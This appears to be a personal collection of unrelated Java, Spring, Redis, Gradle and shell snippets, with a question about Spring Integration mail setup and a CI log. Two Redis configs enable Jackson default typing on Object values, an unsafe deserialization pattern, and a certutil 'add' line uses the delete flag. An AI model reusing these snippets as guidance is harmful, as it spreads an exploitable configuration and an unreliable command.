    // THROW EXCEPTION NOW JUST FOR DEMONSTRATION PURPOSES
                    
            if(true) throw new MissingRequiredFieldException("One of the required fields is missing");
    /////
            UserDto userDto = new UserDto();
            BeanUtils.copyProperties(requestUserDetails, userDto);
            UserDto createdUser = userService.createUser(userDto);
            BeanUtils.copyProperties(createdUser, returnValue);
            returnValue.setHref("/users/" + createdUser.getUserId());
            return returnValue;
        }
        @ResponseStatus(HttpStatus.BAD_REQUEST)
        @ExceptionHandler(MissingRequiredFieldException.class)
        public ErrorMessage handleBadRequest(HttpServletRequest req, Exception ex) {
           return new ErrorMessage(new Date(), ex.getMessage(), req.getRequestURI());
        }
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import javax.validation.Valid;

@Controller
@RequestMapping
final class FormController {

    @GetMapping
    public String displayForm(Model model) {
        model.addAttribute("form", new Form());
        return "form";
    }

    @PostMapping
    public String processForm(@Valid Form form, BindingResult bindingResult, RedirectAttributes redirectAttributes) {
        if (bindingResult.hasErrors()) {
            return "form";
        }
        redirectAttributes.addFlashAttribute("form", form);
        return "redirect:/success";
    }

    @GetMapping("/success")
    public String successPage(Model model, @ModelAttribute("form") Form form) {
        model.addAttribute("form", form);
        return "success";
    }
}
--------------------------------------------------------------------------------------------------------
@Controller
public class CustomerController {

    @GetMapping("/customer")
    public String getCustomer(final Model model) {
        model.addAttribute("customer", new Customer());
        return "customer";
    }

    @PostMapping("/customer")
    public String createCustomer(@Valid Customer customer, BindingResult bindingResult,Model model){

        if(bindingResult.hasErrors()){
            return "customer";
        }
        model.addAttribute("msg", "Customer added");
        model.addAttribute("customer", customer);
        return "customer";
    }
}
--------------------------------------------------------------------------------------------------------
interface Condition {
    companion object {
        const val PREFIX = "touchstone.condition"
    }

    enum class Phase {
        PRE, POST
    }

    fun run(chunkContext: ChunkContext): ExitStatus

    fun phase(): Phase = Phase.PRE

    fun order(): Int = 1

    fun shouldRun(): Boolean = true

    val qualifiedName: String
        get() = listOf(PREFIX, phase().name, javaClass.simpleName)
                .joinToString(separator = ".") { it.toLowerCase(Locale.ENGLISH) }
}
--------------------------------------------------------------------------------------------------------
CREATE VIEW widened AS
  SELECT
    ev."event"              AS "event",
    ev."timestamp"          AS "timestamp",
    ev."customer.id"        AS "customer.id",
    ev."customer.is_vip"    AS "customer.is_vip",
    c."name"                AS "customer.name",
    c."zip_code"            AS "customer.zip_code",
    ev."employee.id"        AS "employee.id",
    ev."employee.job_role"  AS "employee.job_role",
    e."name"                AS "employee.name",
    e."dob"                 AS "employee.dob",
    ev."location.latitude"  AS "location.latitude",
    ev."location.longitude" AS "location.longitude",
    ev."location.elevation" AS "location.elevation",
    ev."package.id"         AS "package.id",
    p."weight"              AS "package.weight",
    ev."vehicle.vin"        AS "vehicle.vin",
    ev."vehicle.mileage"    AS "vehicle.mileage",
    v."make"                AS "vehicle.make",
    v."model"               AS "vehicle.model",
    v."year"                AS "vehicle.year"
  FROM events ev
    LEFT JOIN vehicles v  ON ev."vehicle.vin" = v.vin
    LEFT JOIN employees e ON ev."employee.id" = e.id
    LEFT JOIN packages p  ON ev."package.id"  = p.id
    LEFT JOIN customers c ON ev."customer.id" = c.id;
--------------------------------------------------------------------------------------------------------
  public static Boolean isAbandoned(Instant timestamp) {      // c
    Instant cutoff = Instant.now()
      .minusSeconds(ABANDONED_AFTER_SECS);
    return timestamp.isBefore(cutoff);
  }
--------------------------------------------------------------------------------------------------------
apply plugin: 'java'
apply plugin: 'application'

sourceCompatibility = '1.8'                           // a

mainClassName = 'nile.StreamApp'

repositories {
  mavenCentral()
}

version = '0.2.0'

dependencies {                                        // b
  compile 'org.apache.kafka:kafka-clients:0.9.0.0'
  compile 'com.maxmind.geoip:geoip-api:1.2.14'
  compile 'com.fasterxml.jackson.core:jackson-databind:2.6.3'
  compile 'org.slf4j:slf4j-api:1.7.5'
}

jar {                                                 // c
  manifest {
    attributes 'Main-Class': mainClassName
  }

  from {
    configurations.compile.collect {
      it.isDirectory() ? it : zipTree(it)
    }
  } {
    exclude "META-INF/*.SF"
    exclude "META-INF/*.DSA"
    exclude "META-INF/*.RSA"
  }
}
--------------------------------------------------------------------------------------------------------
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); #a

  ga('create', 'UA-34290195-2', 'test.com'); #b
  ga('send', 'pageview'); #c
  ga('send', 'event', 'video', 'play', 'doge-video-01');

</script>
--------------------------------------------------------------------------------------------------------
Vagrant.configure("2") do |config|

  config.vm.box = "ubuntu/trusty64"
  config.vm.hostname = "ulp"
  config.ssh.forward_agent = true

  # Forward guest ports for YARN
  config.vm.network "forwarded_port", guest: 8088, host: 8088
  config.vm.network "forwarded_port", guest: 8042, host: 8042

  config.vm.provider :virtualbox do |vb|
    vb.name = Dir.pwd().split("/")[-1] + "-" + Time.now.to_f.to_i.to_s
    vb.customize ["modifyvm", :id, "--natdnshostresolver1", "on"]
    vb.customize [ "guestproperty", "set", :id, "--timesync-threshold", 10000 ]
    # Scala is memory-hungry
    vb.memory = 3200
  end

  config.vm.provision :shell do |sh|
    sh.path = "vagrant/up.bash"
  end

end
--------------------------------------------------------------------------------------------------------
@Async
public Future<?> consumeSegmentEvents() {
    final ParameterizedTypeReference<ServerSentEvent<String>> type = new ParameterizedTypeReference<>() {
    };
    final Flux<ServerSentEvent<String>> eventStream = this.client.get()
        .uri("/api/pem/segments/stream")
        .accept(MediaType.TEXT_EVENT_STREAM)
        .retrieve()
        .bodyToFlux(type);
    return new AsyncResult<Flux<?>>(eventStream);
    //eventStream.subscribe(content -> log.info("Current time: {} - Received SSE: name[{}], id [{}], content[{}] ", LocalTime.now(), content.event(), content.id(), content.data()), error -> log.error("Error receiving SSE: {}", error), () -> log.info("Completed!!!"));
}
--------------------------------------------------------------------------------------------------------
    @Override
    public PageWrapper<E> getAll(int page, int size) {
        final ParameterizedTypeReference<List<E>> responseType = new ParameterizedTypeReference<>() {};
        final UriComponentsBuilder builder = UriComponentsBuilder.fromHttpUrl(QUICK_POLL_URI_2).queryParam("page", page).queryParam("size", size);
        final ResponseEntity responseEntity = restTemplate.exchange(builder.build().toUri(), HttpMethod.GET, null, responseType);
        final PageWrapper<E> allPolls = responseEntity.getBody();
        return allPolls;
    }

    @Override
    public List<E> getAll() {
        final ParameterizedTypeReference<List<E>> responseType = new ParameterizedTypeReference<>() {};
        final ResponseEntity<List<E>> responseEntity = restTemplate.exchange(QUICK_POLL_URI_V1, HttpMethod.GET, null, responseType);
        return responseEntity.getBody();
    }
--------------------------------------------------------------------------------------------------------
Map<String, Integer> map = Stream.of(new Object[][] { 
    { "data1", 1 }, 
    { "data2", 2 }, 
}).collect(Collectors.toMap(data -> (String) data[0], data -> (Integer) data[1]));

Map<String, String> map = Stream.of(new String[][] {
  { "Hello", "World" }, 
  { "John", "Doe" }, 
}).collect(Collectors.toMap(data -> data[0], data -> data[1]));
--------------------------------------------------------------------------------------------------------
    /**
     * Provide a String representation of this validator.
     *
     * @return A String representation of this validator
     */
    @Override
    public String toString() {
        StringBuilder buffer = new StringBuilder();
        buffer.append("RegexValidator{");
        for (int i = 0; i < this.patterns.length; i++) {
            if (i > 0) {
                buffer.append(",");
            }
            buffer.append(this.patterns[i].pattern());
        }
        buffer.append("}");
        return buffer.toString();
    }
--------------------------------------------------------------------------------------------------------
PeriodFormat.space=\u0020
PeriodFormat.comma=,
PeriodFormat.commandand=,\u0438
PeriodFormat.commaspaceand=, \u0438
PeriodFormat.commaspace=,\u0020
PeriodFormat.spaceandspace=\ \u0438\u0020
PeriodFormat.regex.separator=%
PeriodFormat.years.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.years.list=\ \u0433\u043E\u0434%\ \u0433\u043E\u0434\u0430%\ \u043B\u0435\u0442
PeriodFormat.months.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.months.list=\ \u043C\u0435\u0441\u044F\u0446%\ \u043C\u0435\u0441\u044F\u0446\u0430%\ \u043C\u0435\u0441\u044F\u0446\u0435\u0432
PeriodFormat.weeks.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.weeks.list=\ \u043D\u0435\u0434\u0435\u043B\u044F%\ \u043D\u0435\u0434\u0435\u043B\u0438%\ \u043D\u0435\u0434\u0435\u043B\u044C
PeriodFormat.days.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.days.list=\ \u0434\u0435\u043D\u044C%\ \u0434\u043D\u044F%\ \u0434\u043D\u0435\u0439
PeriodFormat.hours.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.hours.list=\ \u0447\u0430\u0441%\ \u0447\u0430\u0441\u0430%\ \u0447\u0430\u0441\u043E\u0432
PeriodFormat.minutes.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.minutes.list=\ \u043C\u0438\u043D\u0443\u0442\u0430%\ \u043C\u0438\u043D\u0443\u0442\u044B%\ \u043C\u0438\u043D\u0443\u0442
PeriodFormat.seconds.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.seconds.list=\ \u0441\u0435\u043A\u0443\u043D\u0434\u0430%\ \u0441\u0435\u043A\u0443\u043D\u0434\u044B%\ \u0441\u0435\u043A\u0443\u043D\u0434
PeriodFormat.milliseconds.regex=^1$%[0-9]*(?<!1)[2-4]$%[0-9]*
PeriodFormat.milliseconds.list=\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434\u0430%\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434\u044B%\ \u043C\u0438\u043B\u043B\u0438\u0441\u0435\u043A\u0443\u043D\u0434
--------------------------------------------------------------------------------------------------------
apply plugin: 'java'
 
repositories {
    mavenCentral()
}
 
dependencies {
    compile group: 'org.slf4j', name: 'slf4j-api', version: '1.7.25'
    compile group: 'org.slf4j', name: 'slf4j-simple', version: '1.7.25'
}

jar {
    manifest {
        attributes "Main-Class": "com.baeldung.fatjar.Application"
    }
 
    from {
        configurations.compile.collect { it.isDirectory() ? it : zipTree(it) }
    }
}

task customFatJar(type: Jar) {
    manifest {
        attributes 'Main-Class': 'com.baeldung.fatjar.Application'
    }
    baseName = 'all-in-one-jar'
    from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }
    with jar
}

buildscript {
    repositories {
        jcenter()
    }
    dependencies {
        classpath 'com.github.jengelman.gradle.plugins:shadow:2.0.1'
    }
}
 
apply plugin: 'java'
apply plugin: 'com.github.johnrengelman.shadow'
--------------------------------------------------------------------------------------------------------
POST /test/servertest.jsp HTTP/1.1
Host: center:1001
Accept-Language: en,ru-ru;q=0.8,ru;q=0.5,en-us;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7
Content-Type: multipart/form-data; boundary=---------------------------265001916915724
Content-Length: 927
 
-----------------------------265001916915724
Content-Disposition: form-data; name="txt_1"
 
Гравитация
-----------------------------265001916915724
Content-Disposition: form-data; name="user[]"
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="user[]"
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="foto"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="pics[]"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="pics[]"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------265001916915724
Content-Disposition: form-data; name="btnsubmit"
 
Send
-----------------------------265001916915724--

IOUtils.toString(in, StandardCharsets.UTF_8);
IOUtils.toByteArray(is), charset
IOUtils.toString(mailInfo.getBody().getBytes(), StandardCharsets.US_ASCII.name);

IOUtils.toString(fileContent.getBytes("us-ascii"), "cp1251");

IOUtils.toString(fileContent.getBytes("utf-8"), "us-ascii");
--------------------------------------------------------------------------------------------------------


I am trying to add Spring Integration to a REST MVC Spring app I have been writing. I am using the latest Spring 4.2.x for core, integration and mvc. The idea is to create separate application contexts as on the Dynamic FTP example. The reason why is because I can send emails from 2 separated accounts as well as listen from 2 separated accounts hence having separate application contexts as well as environment variables to aid on bean creation for each context helps a bunch.

I apologize for the newbie questions, but I am having a hard time with the manual as well as trying to figure out how to setup SMTP email configuration class without XML.

I want to have both receive and send integration channels. All email settings will be configured from enviroment variables so I have injected the enviroment: @Autowired Environment env;

I can define:

    A MailSender bean
    A MailSendingMessageHandler bean
    A MessageChannel for the SMTP (outbound)

Now, on XML configurations you have an outbound-channel-adapter where you wire the mail-sender bean as well as the MessageChannel

My goal is to have configurations for:

    Send emails.
    Listen to IMAP emails and process them.

For sending emails, the idea is to get from a rest endpoint, calling a service and that service is what will put a message to Integration SMTP outbound channel to send an email. Looks like, by using the MailSendingMessageHandler it will get the Integration Message and convert to a Mail Message for the MailSender. I have no idea on how to wire the MailSendingMessageHandler to the outbound channel so that an email can be send. Also I do not know how to, from my @Service class that is called by the rest endpoint how to create the messages and send them through the outbound SMTP channel so emails can be send. On one rest call I send all email recipients I want to reach. Before, each email message body is properly formatted so that I can create each Integration Message (as an email) that will be handled and converted by MailSendingMessageHandler. I have tried to find examples online without success on how to accomplish this.

Any examples you could redirect me? Thanks in advance!

So far I have for the configuration:

import java.util.Properties;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.integration.annotation.InboundChannelAdapter;
import org.springframework.integration.config.EnableIntegration;
import org.springframework.integration.annotation.Poller;
import org.springframework.integration.channel.DirectChannel;
import org.springframework.integration.channel.QueueChannel;
import org.springframework.integration.core.MessageSource;
import org.springframework.integration.mail.MailReceiver;
import org.springframework.integration.mail.MailReceivingMessageSource;
import org.springframework.integration.mail.MailSendingMessageHandler;
import org.springframework.mail.MailMessage;
import org.springframework.mail.MailSender;
import org.springframework.mail.javamail.JavaMailSenderImpl;
import org.springframework.messaging.MessageChannel;
import org.springframework.messaging.MessagingException;


import org.springframework.core.env.Environment;

@Configuration
@EnableIntegration
public class IntegrationEmailConfig {

@Autowired 
Environment env;

@Bean
public static PropertySourcesPlaceholderConfigurer pspc() {
    return new PropertySourcesPlaceholderConfigurer();
}

@Bean
@InboundChannelAdapter(value = "emailInboundChannel", poller = @Poller(fixedDelay = "5000") )
public MailReceivingMessageSource mailMessageSource(MailReceiver imapMailReceiver) {
    return new MailReceivingMessageSource(imapMailReceiver);
}

private Properties additionalMailProperties() { 
    Properties properties = new Properties();
    if (env.containsProperty("mail.smtp.auth")) {
        properties.setProperty("mail.smtp.auth",env.getProperty("mail.smtp.auth"));
    }
    if (env.containsProperty("mail.smtp.starttls.enable")) {
        properties.setProperty("mail.smtp.starttls.enable",env.getProperty("mail.smtp.starttls.enable"));
    }
    return properties; 
} 


@Bean
public MailSender mailSender() throws Exception {
    JavaMailSenderImpl mailSender = new JavaMailSenderImpl();
    if (env.containsProperty("mail.server.host")) {
        mailSender.setHost(env.getProperty("mail.server.host"));
    } else {
        throw new Exception("Missing mail.server.host property");
    }
    if (env.containsProperty("mail.server.port")) {
        mailSender.setPort(Integer.parseInt(env.getProperty("mail.server.port")));
    } else {
        throw new Exception("Missing mail.server.port property");
    }
    if (env.containsProperty("mail.server.username")) {
        mailSender.setUsername(env.getProperty("mail.server.username"));
    } else {
        throw new Exception("Missing mail.server.username property");
    }
    if (env.containsProperty("mail.server.password")) {
        mailSender.setPassword(env.getProperty("mail.server.password"));
    } else {
        throw new Exception("Missing mail.server.password property");
    }
    mailSender.setJavaMailProperties(additionalMailProperties());
    return mailSender;
}

@Bean
public MailSendingMessageHandler mailSendingMessageHandler() throws Exception {
    MailSendingMessageHandler mailSendingMessageHandler = new MailSendingMessageHandler(mailSender());
    //mailSendingMessageHandler.setChannelResolver(channelResolver);
    return mailSendingMessageHandler;
}

/*    @Bean
public DirectChannel outboundMail() {
    DirectChannel outboundChannel = new DirectChannel();
    return outboundChannel;
}
*/    
@Bean
public MessageChannel smtpChannel() {
    return new DirectChannel();
}


/*    @Bean
@Value("${imap.url}")
public MailReceiver imapMailReceiver(String imapUrl) {
//      ImapMailReceiver imapMailReceiver = new ImapMailReceiver(imapUrl);
//      imapMailReceiver.setShouldMarkMessagesAsRead(true);
//      imapMailReceiver.setShouldDeleteMessages(false);
//      // other setters here
//      return imapMailReceiver;
    MailReceiver receiver = mock(MailReceiver.class);
    MailMessage message = mock(Message.class);
    when(message.toString()).thenReturn("Message from " + imapUrl);
    Message[] messages = new Message[] {message};
    try {
        when(receiver.receive()).thenReturn(messages);
    }
    catch (MessagingException e) {
        e.printStackTrace();
    }
    return receiver;
}*/
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Primary;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.core.RedisOperations;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.serializer.RedisSerializer;
import org.springframework.data.redis.serializer.SerializationException;
import org.springframework.data.redis.serializer.StringRedisSerializer;

import com.fasterxml.jackson.annotation.JsonTypeInfo.As;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;

@SpringBootApplication
public class App {

	@Bean
	@Primary
	RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory rcf) {

		RedisTemplate<String, Object> template = new RedisTemplate<>();
		template.setConnectionFactory(rcf);
		template.setKeySerializer(new StringRedisSerializer());
		template.setValueSerializer(new JsonRedisSerializer());

		return template;
	}

	static class JsonRedisSerializer implements RedisSerializer<Object> {

		private final ObjectMapper om;

		public JsonRedisSerializer() {
			this.om = new ObjectMapper().enableDefaultTyping(DefaultTyping.NON_FINAL, As.PROPERTY);
		}

		@Override
		public byte[] serialize(Object t) throws SerializationException {
			try {
				return om.writeValueAsBytes(t);
			} catch (JsonProcessingException e) {
				throw new SerializationException(e.getMessage(), e);
			}
		}

		@Override
		public Object deserialize(byte[] bytes) throws SerializationException {
			
			if(bytes == null){
				return null;
			}
			
			try {
				return om.readValue(bytes, Object.class);
			} catch (Exception e) {
				throw new SerializationException(e.getMessage(), e);
			}
		}
	}

	public static void main(String[] args) {

		RedisOperations<String, Object> redis = SpringApplication.run(App.class, args).getBean(RedisOperations.class);
		
		A a = new B();
		System.out.println(a);
		redis.opsForValue().set("foo", a);
		
		A aa = (A)redis.opsForValue().get("foo");
		System.out.println(aa);
		
	}

	public static class A implements Serializable{
		
		long longProperty = System.currentTimeMillis();
		String stringProperty = "foo";

		public String getStringProperty() {
			return stringProperty;
		}

		public void setStringProperty(String stringProperty) {
			this.stringProperty = stringProperty;
		}

		@Override
		public String toString() {
			return "A [stringProperty=" + stringProperty + "]";
		}
	}

	public static class B extends A {

		int intProperty = 42;

		public int getIntProperty() {
			return intProperty;
		}

		public void setIntProperty(int intProperty) {
			this.intProperty = intProperty;
		}

		@Override
		public String toString() {
			return "B [intProperty=" + intProperty + ", stringProperty=" + stringProperty + "]";
		}
	}
}
--------------------------------------------------------------------------------------------------------@Component
public class RedisObjectHelper {

    @Resource
    private RedisTemplate<String, ?> redisTemplate;
    private HashOperations<String, byte[], byte[]> hashOperations;
    private HashMapper<Object, byte[], byte[]> mapper;

    @PostConstruct
    public void init() {
        mapper = new ObjectHashMapper(new CustomConversions(Arrays.asList(new Timestamp2ByteConverter(), new Byte2TimestampConverter())));
        hashOperations = redisTemplate.opsForHash();
    }
    // and any methods
}
--------------------------------------------------------------------------------------------------------
SimpleKeyValueRepository
--------------------------------------------------------------------------------------------------------

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;

import java.util.concurrent.TimeUnit;

@Service
public class RedisService {

    @Autowired
    private RedisTemplate< String, Object > template;

    public Object getValue(final String key) {
        return template.opsForValue().get(key);
    }

    public void setValue(final String key, final String value) {
        template.opsForValue().set(key, value);

        // set a expire for a message
        template.expire(key, 5, TimeUnit.SECONDS);
    }

}
--------------------------------------------------------------------------------------------------------
management.health.status.order=FATAL, DOWN, OUT_OF_SERVICE, UNKNOWN, UP
The HTTP status code in the response reflects the overall health status (for example, UP maps to 200, while OUT_OF_SERVICE and DOWN map to 503). You might also want to register custom status mappings if you access the health endpoint over HTTP. For example, the following property maps FATAL to 503 (service unavailable):

management.health.status.http-mapping.FATAL=503

--------------------------------------------------------------------------------------------------------
@Override
protected void configureJacksonObjectMapper(ObjectMapper objectMapper) {
    objectMapper.registerModule(new SimpleModule("MyCustomModule") {
        @Override
        public void setupModule(SetupContext context) {
            context.addAbstractTypeResolver(
                new SimpleAbstractTypeResolver().addMapping(MyInterface.class,
                                                            MyInterfaceImpl.class)
            );
        }
    });
}
IdPropertyIdentifierAccessor
--------------------------------------------------------------------------------------------------------
spring:
  boot:
    admin:
      client:
        url: http://spring-boot-admin-server-url:8080
        instance:
          service-url: http://you-application-url:8080
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonAutoDetect;
import com.fasterxml.jackson.annotation.PropertyAccessor;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.CachingConfigurerSupport;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;
import org.springframework.data.redis.serializer.RedisSerializer;
import org.springframework.data.redis.serializer.StringRedisSerializer;

/**
 * @author cwenao
 * @version $Id RedisConfig.java, v 0.1 2017-01-29 15:17 cwenao Exp $$
 */
@Configuration
@EnableCaching
@AutoConfigureAfter({DataConfig.class,MybatisConfig.class})
public class RedisConfig extends CachingConfigurerSupport{

    @Bean(name="redisTemplate")
    public RedisTemplate<String, String> redisTemplate(RedisConnectionFactory factory) {

        RedisTemplate<String, String> template = new RedisTemplate<>();


        RedisSerializer<String> redisSerializer = new StringRedisSerializer();

        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
        ObjectMapper om = new ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);

        template.setConnectionFactory(factory);
        //key序列化方式
        template.setKeySerializer(redisSerializer);
        //value序列化
        template.setValueSerializer(jackson2JsonRedisSerializer);
        //value hashmap序列化
        template.setHashValueSerializer(jackson2JsonRedisSerializer);

        return template;
    }

    @Bean
    public CacheManager cacheManager(@SuppressWarnings("rawtypes")RedisTemplate redisTemplate) {

        RedisCacheManager cacheManager = new RedisCacheManager(redisTemplate);
        cacheManager.setDefaultExpiration(3000);
        return cacheManager;
    }
}
--------------------------------------------------------------------------------------------------------
List locally trusted certifcates
certutil -d sql:$HOME/.pki/nssdb -L
Add locally trusted certifcate
certutil -d sql:$HOME/.pki/nssdb -D -t "P,," -n ~/Downloads/apps.tdlabs.local.crt -i ~/Downloads/apps.tdlabs.local.crt
Delete locally tristed certificate
certutil -d sql:$HOME/.pki/nssdb -D -n app1
--------------------------------------------------------------------------------------------------------
RedisCluster.builder()
                .sentinelPorts(redisSentinels) //btw, order counts here, if you set ports after setting replication groups
                .serverPorts(redisHosts) //you will get different ports. Go figure
                .withServerBuilder(new CustomClusterRedisServerBuilder().setting("maxmemory 128").setting("maxheap 128M")) //same goes for settings
                .withSentinelBuilder(RedisSentinel.builder().setting("maxmemory 128").setting("maxheap 128M"))
                .sentinelCount(3)
                .quorumSize(2)
                .replicationGroup("master1", 1)
                .replicationGroup("master2", 1)
                .replicationGroup("master3", 1)
                .build()
--------------------------------------------------------------------------------------------------------
Usage: ./redis-server [/path/to/redis.conf]
       ./redis-server - (read config from stdin)
       ./redis-server --test-memory <megabytes>
--------------------------------------------------------------------------------------------------------
curl -Lo jsoup.zip https://github.com/jhy/jsoup/archive/master.zip
unzip jsoup.zip
cd jsoup-master
mvn install
--------------------------------------------------------------------------------------------------------
String cleanedHTML = Jsoup.clean(strHTML, Whitelist.none());
String cleanedHTML = Jsoup.clean(strHTML, Whitelist.relaxed());
String str = Jsoup.clean(strHTML, Whitelist.none().addTags("div"));
--------------------------------------------------------------------------------------------------------
Collection< PublicationSession > wantedPublications = 
    effectiveDatePublicationMap.values() // Collection<List<PublicationSession>>
                               .stream() // Stream<List<PublicationSession>>
                               .flatMap(list->list.stream()) // Stream<PublicationSession>
                               .filter(pub -> PublicationStatus.valueOf(pub.getPublishStatus()) == PublicationStatus.COMPLETE)
                               .sorted(Comparator.comparing(PublicationSession::getCreateTime))
                               .collect(toMap(p -> p.getPublicationSession().getEffDateTime(), UnaryOperator.identity(), PICK_LATEST))
                               .values();
							   
List<String> destList = new ArrayList<>(Arrays.asList("foo"));
List<String> newList = Arrays.asList("0", "1", "2", "3", "4", "5");
newList.parallelStream()
       .collect(Collectors.toCollection(() -> destList));
System.out.println(destList);
--------------------------------------------------------------------------------------------------------
Worker information
hostname: 4c9e34bc-1fb8-4cd3-bf1b-6b2010d9e6d3@1.production-1-worker-org-gce-1hv2
version: v6.2.0 https://github.com/travis-ci/worker/tree/5e5476e01646095f48eec13196fdb3faf8f5cbf7
instance: travis-job-d0317f09-5637-4bd3-b60b-51bf4b72ad81 travis-ci-garnet-trusty-1512502259-986baf0 (via amqp)
startup: 6.871559117s
system_info
Build system information
Build language: java
Build group: stable
Build dist: trusty
Build id: 543259452
Job id: 543259454
Runtime kernel version: 4.4.0-101-generic
travis-build version: 9f4eb462c
Build image provisioning date and time
Tue Dec  5 19:58:13 UTC 2017
Operating System Details
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty
Cookbooks Version
7c2c6a6 https://github.com/travis-ci/travis-cookbooks/tree/7c2c6a6
git version
git version 2.15.1
bash version
GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
gcc version
gcc (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4
Copyright (C) 2013 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
docker version
Client:
 Version:      17.09.0-ce
 API version:  1.32
 Go version:   go1.8.3
 Git commit:   afdb6d4
 Built:        Tue Sep 26 22:42:38 2017
 OS/Arch:      linux/amd64
Server:
 Version:      17.09.0-ce
 API version:  1.32 (minimum version 1.12)
 Go version:   go1.8.3
 Git commit:   afdb6d4
 Built:        Tue Sep 26 22:41:20 2017
 OS/Arch:      linux/amd64
 Experimental: false
clang version
clang version 5.0.0 (tags/RELEASE_500/final)
Target: x86_64-unknown-linux-gnu
Thread model: posix
InstalledDir: /usr/local/clang-5.0.0/bin
jq version
jq-1.5
bats version
Bats 0.4.0
shellcheck version
0.4.6
shfmt version
v2.0.0
ccache version
ccache version 3.1.9
Copyright (C) 2002-2007 Andrew Tridgell
Copyright (C) 2009-2011 Joel Rosdahl
This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 3 of the License, or (at your option) any later
version.
cmake version
cmake version 3.9.2
CMake suite maintained and supported by Kitware (kitware.com/cmake).
heroku version
heroku-cli/6.14.39-addc925 (linux-x64) node-v9.2.0
imagemagick version
Version: ImageMagick 6.7.7-10 2017-07-31 Q16 http://www.imagemagick.org
md5deep version
4.2
mercurial version
Mercurial Distributed SCM (version 4.2.2)
(see https://mercurial-scm.org for more information)
Copyright (C) 2005-2017 Matt Mackall and others
This is free software; see the source for copying conditions. There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
mysql version
mysql  Ver 14.14 Distrib 5.6.33, for debian-linux-gnu (x86_64) using  EditLine wrapper
openssl version
OpenSSL 1.0.1f 6 Jan 2014
packer version
Packer v1.0.2
Your version of Packer is out of date! The latest version
is 1.1.2. You can update by downloading from www.packer.io
postgresql client version
psql (PostgreSQL) 9.6.6
ragel version
Ragel State Machine Compiler version 6.8 Feb 2013
Copyright (c) 2001-2009 by Adrian Thurston
subversion version
svn, version 1.8.8 (r1568071)
   compiled Aug 10 2017, 17:20:39 on x86_64-pc-linux-gnu
Copyright (C) 2013 The Apache Software Foundation.
This software consists of contributions made by many people;
see the NOTICE file for more information.
Subversion is open source software, see http://subversion.apache.org/
The following repository access (RA) modules are available:
* ra_svn : Module for accessing a repository using the svn network protocol.
  - with Cyrus SASL authentication
  - handles 'svn' scheme
* ra_local : Module for accessing a repository on local disk.
  - handles 'file' scheme
